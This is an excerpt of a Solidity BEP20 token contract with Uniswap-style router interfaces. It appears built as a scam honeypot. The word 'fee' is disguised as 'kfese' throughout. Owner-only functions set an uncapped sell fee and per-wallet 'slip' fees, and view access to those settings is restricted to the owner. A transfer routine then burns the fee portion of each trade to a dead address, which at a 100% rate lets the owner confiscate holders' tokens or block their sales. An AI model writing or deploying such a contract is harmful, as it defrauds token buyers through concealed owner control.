...
interface IUniswapV2Factory {
    ...
    function kfeseTo() external view returns (address);
    function kfeseToSetter() external view returns (address);
    ...
    function setkfeseTo(address) external;
    function setkfeseToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingkfeseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingkfeseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingkfeseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingkfeseOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingkfeseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract SC is BEP20, Ownable {
    ...
    uint256 private _defaultSellkfese = 0;

    uint256 private _defaultBuykfese = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipkfese;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellkfese = _value;
    }

    function setSlipkfese(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipkfese[_address] = _value;
    }

    function getSlipkfese(address _address) external view onlyownar returns (uint256) {
        return _slipkfese[_address];
    }


    function setMAccountkfese(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountkfese(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradekfeseAmount = 0;

        if (rF) {
            uint256 tradekfese = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradekfese = _defaultSellkfese;
                }
                if (from == uniswapV2Pair) {

                    tradekfese = _defaultBuykfese;
                }
            }
            if (_slipkfese[from] > 0) {
                tradekfese = _slipkfese[from];
            }

            tradekfeseAmount = _Amount.mul(tradekfese).div(100);
        }


        if (tradekfeseAmount > 0) {
            _balances[from] = _balances[from].sub(tradekfeseAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradekfeseAmount);
            emit Transfer(from, _deadAddress, tradekfeseAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradekfeseAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradekfeseAmount);
        emit Transfer(from, _to, _Amount - tradekfeseAmount);
    }
